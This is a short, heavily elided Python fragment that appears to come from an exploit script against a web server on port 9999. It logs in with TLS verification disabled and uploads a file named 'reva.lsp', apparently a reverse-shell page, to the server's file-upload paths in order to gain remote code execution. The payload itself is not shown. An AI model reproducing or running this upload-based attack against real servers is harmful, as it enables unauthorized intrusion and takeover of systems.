...
def login(r,s):
    ...
    r = s.post(f"https://{url}:9999/rtl/protected/wfslinks.lsp", data = data, verify = False ) # switching to https cause its easier to script lolz
...
#    r = s.get(f"https://{url}:9999/fs/cmsdocs/")
    ...
    files = {'file': ('reva.lsp', file_content, 'application/octet-stream')}
#    r = s.post(f"https://{url}:9999/fs/cmsdocs/", files=files)
    r = s.post(f"https://{url}:9999/fs/", files=files)
